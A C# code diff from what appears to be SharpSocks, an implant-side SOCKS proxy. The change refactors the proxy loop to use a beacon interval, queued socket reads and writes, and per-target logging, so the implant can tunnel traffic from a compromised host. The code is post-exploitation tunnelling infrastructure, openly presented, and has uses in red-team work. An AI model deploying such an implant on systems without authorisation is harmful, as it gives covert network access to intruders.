@@ -3,30 +3,44 @@ using ImplantSide.Classes.Comms;
 using ImplantSide.Classes.ErrorHandler;
 using ImplantSide.Classes.Target;
 using ImplantSide.Interfaces;
+using SharpSocksImplant.Classes.Socks;
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace SocksProxy.Classes.Socks
 {
-    public class SocksLoopController
-    {
-        internal Dictionary<String, TargetInfo> _targets = new Dictionary<String, TargetInfo>();
-        public InternalErrorHandler ErrorHandler { get; set; }
-        public IImplantLog ImplantComms { get; set; }
-        public IEncryptionHelper Encryption { get; set; }
-        public CommandCommunicationHandler CmdCommshandler { get; set; }
-        public AutoResetEvent Timeout = new AutoResetEvent(false);
-        static readonly ushort TOTALSOCKETTIMEOUT = 5000;
-        static readonly ushort TIMEBETWEENREADS = 500;
-        static readonly ushort TIMEBETWEENSERVERSENDS = 500;
+	public class SocksLoopController
+	{
+		internal Dictionary<String, TargetInfo> _targets = new Dictionary<String, TargetInfo>();
+		public InternalErrorHandler ErrorHandler { get; set; }
+		public IImplantLog ImplantComms { get; set; }
+		public IEncryptionHelper Encryption { get; set; }
+		public CommandCommunicationHandler CmdCommshandler { get; set; }
+		public AutoResetEvent Timeout = new AutoResetEvent(false);
+		public Int16 BeaconTime { get; set; }
+		public Dictionary<String, Int16> _mapTargetToCount = new Dictionary<String, Int16>();
+		static SocksSocketComms socketComms;
+		static List<Task> _socketCommsTasks = new List<Task>();
 
-        public bool OpenNewConnectionToTarget(String targetId, String targetHost, ushort targetPort)
+		public SocksLoopController(IImplantLog icomms, CommandCommunicationHandler comms, Int16 beaconTime)
+		{
+			ImplantComms = icomms;
+			CmdCommshandler = comms;
+			BeaconTime = beaconTime;
+			socketComms = new SocksSocketComms() { ImplantComms = ImplantComms, CmdCommshandler = comms, BeaconTime = beaconTime};
+			_socketCommsTasks.Add(Task.Factory.StartNew(() => socketComms.WriteToSocket(), TaskCreationOptions.LongRunning));
+			_socketCommsTasks.Add(Task.Factory.StartNew(() => socketComms.ReadFromSocket(), TaskCreationOptions.LongRunning));
+			_socketCommsTasks.Add(Task.Factory.StartNew(() => socketComms.SendToTarget(), TaskCreationOptions.LongRunning));
+		}
+		
+		public bool OpenNewConnectionToTarget(String targetId, String targetHost, ushort targetPort)
         {
-			var target = new TargetInfo() { TargetPort = targetPort, TargetHost = targetHost };
-            System.Net.Sockets.AddressFamily AF_TYPE = System.Net.Sockets.AddressFamily.InterNetwork;
+			var target = new TargetInfo() { TargetId = targetId, TargetPort = targetPort, TargetHost = targetHost };
+			System.Net.Sockets.AddressFamily AF_TYPE = System.Net.Sockets.AddressFamily.InterNetwork;
             //Step 1. Open connection to target
             IPAddress targetIP = null;
             try
@@ -80,7 +94,7 @@ namespace SocksProxy.Classes.Socks
             }
 
             //Step 2. Start Proxy Loop
-            target.ProxyLoop = new System.Threading.Tasks.Task((g) =>
+            target.ProxyLoop = new Task((g) =>
             {
                 try
                 {
@@ -94,21 +108,22 @@ namespace SocksProxy.Classes.Socks
                         if (target.TargetTcpClient.Connected)
                             target.TargetTcpClient.Close();
                 }
-            }, targetId);
+            }, targetId, TaskCreationOptions.LongRunning);
 
             _targets.Add(targetId, target);
-            target.ProxyLoop.Start();
+			socketComms.AddTarget(targetId, target);
+			target.ProxyLoop.Start();
             return true;
         }
 
         bool ProxyLoop(String targetId)
         {
             List<byte> toSend = null;
-			List<byte> sent = null;
-			bool timedOut = false;
-            bool connectionHasFailed = false;
-            TargetInfo target = null;
-            try
+            bool connectionHasFailed = false, connectionDead = false;
+			TargetInfo target = null;
+			_mapTargetToCount.Add(targetId, 1);
+			var wait = new ManualResetEvent(false);
+			try
             {
                 target = _targets[targetId];
                 if (null == target)
@@ -116,98 +131,38 @@ namespace SocksProxy.Classes.Socks
                     ErrorHandler.LogError("Can't find target for GUID: " + targetId.ToString() + " exiting this proxy loop");
                     return true;
                 }
-                var timeout = 0;
-                var timeoutCtr = 0;
-                var serverTimeCtr = 0;
-
-                toSend = CmdCommshandler.Send(targetId, "nochange", null, out bool connectionDead);
-				if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
-				{
-					ErrorHandler.LogError($"Connection looks dead EXITING");
-					return false;
-				}
-                while (!target.Exit && !timedOut)
+				
+				while (!target.Exit)
                 {
-                    var stream = target.TargetTcpClient.GetStream();
-                    if (!target.TargetTcpClient.Connected)
+					toSend = CmdCommshandler.Send(target, "nochange", null, out connectionDead);
+					if (null == toSend || connectionDead) 
                     {
-                        timedOut = true;
-                        break;
+						ErrorHandler.LogError($"[{target.TargetId}] Connection looks dead EXITING");
+						return target.Exit = connectionDead;
                     }
-                    if (toSend != null && toSend.Count() > 0)
-                    {
-                        stream.Write(toSend.ToArray(), 0, toSend.Count());
-                        stream.Flush();
-                        ImplantComms.LogMessage($"Written {toSend.Count()} from client");
-						//Clear out the data to send after it has been sent
-						sent = toSend;
-						toSend = null;
-                    }
-
-                    while ((null == toSend || toSend.Count() == 0) && !(timedOut =(timeoutCtr > (TOTALSOCKETTIMEOUT / TIMEBETWEENREADS))))
-                    {
-                        if (stream.DataAvailable)
-                        {
-                            ImplantComms.LogMessage($"Socks {target.TargetTcpClient.Client.RemoteEndPoint.ToString()} reading {target.TargetTcpClient.Available} bytes");
-
-                            var bytesRead = 0;
-                            var lstBuffer = new List<byte>();
-                            var arrayBuffer = new byte[65535];
-
-                            bytesRead = stream.Read(arrayBuffer, 0, 65535);
-                            lstBuffer.AddRange(arrayBuffer.ToList().Take(bytesRead));
-
-							arrayBuffer = new byte[65535];
-							while (bytesRead > 0 && stream.DataAvailable)
-                            {
-                                bytesRead = stream.Read(arrayBuffer, 0, 65535);
-                                lstBuffer.AddRange(arrayBuffer.ToList().Take(bytesRead));
-                            }
-
-							if (lstBuffer.Count() > 0)
-							{
-								toSend = CmdCommshandler.Send(targetId, "nochange", lstBuffer, out connectionDead);
-								if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
-								{
-									ErrorHandler.LogError($"Connection looks dead EXITING");
-									return connectionDead;
-								}
-							}
-
-							timeout = 0;
-                            timeoutCtr = 0;
-                        }
-                        else
-                        {
-                            timeout = TIMEBETWEENREADS;
-                            if (timeoutCtr > 5)
-                            {
-								//Nothing is being read from the server quick check to see if the client has anything
-								
-								ImplantComms.LogMessage($" Nothing received after sending {sent?.Count ?? 0 } bytes");
-
-								toSend = CmdCommshandler.Send(targetId, "nochange", null, out connectionDead);
-                                if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
-                                {
-									ErrorHandler.LogError($"Connection looks dead EXITING");
-									return connectionDead;
-                                }
-                            }
-                            Timeout.WaitOne(timeout);
-                            timeoutCtr++;
-                        }
-                    }
-                }
+					else if (toSend.Count > 0 )
+					{
+						target.WriteQueue.Enqueue(toSend);
+						socketComms.SentData.Set();
+						_mapTargetToCount[targetId] = 1;
+					}
+					else
+						if (_mapTargetToCount[targetId]++ == 2)
+							ImplantComms.LogMessage($"[{target.TargetId}] Nothing received after sending request");
+						else 
+							ImplantComms.LogMessage($"[{target.TargetId}] Nothing received after sending request({_mapTargetToCount[targetId]})");
+					wait.WaitOne(BeaconTime);
+				}
 				return true;
             }
             catch(Exception ex)
             {
-                ErrorHandler.LogError($"ERROR: {target.TargetTcpClient.Client.RemoteEndPoint.ToString()} {ex.Message}");
+                ErrorHandler.LogError($"[{target.TargetId}] ERROR: {target.TargetTcpClient.Client.RemoteEndPoint.ToString()} {ex.Message}");
                 if (null != target && null != target.TargetTcpClient)
                     if (target.TargetTcpClient.Connected)
                         target.TargetTcpClient.Close();
                 else
-                        ErrorHandler.LogError($"Target is null {target == null} & target.TargetTcpClient is null {target.TargetTcpClient == null} ");
+                        ErrorHandler.LogError($"[{target.TargetId}] Target is null {target == null} & target.TargetTcpClient is null {target.TargetTcpClient == null} ");
             }
             finally
             {
@@ -216,8 +171,9 @@ namespace SocksProxy.Classes.Socks
                         target.TargetTcpClient.Close();
 
                 if (!connectionHasFailed)
-                    CmdCommshandler.Send(targetId, "closed", null, out bool connectionDead);
+                    CmdCommshandler.Send(target, "closed", null, out connectionDead);
             }
+			target.Exit = true;
 			return true;
         }
 
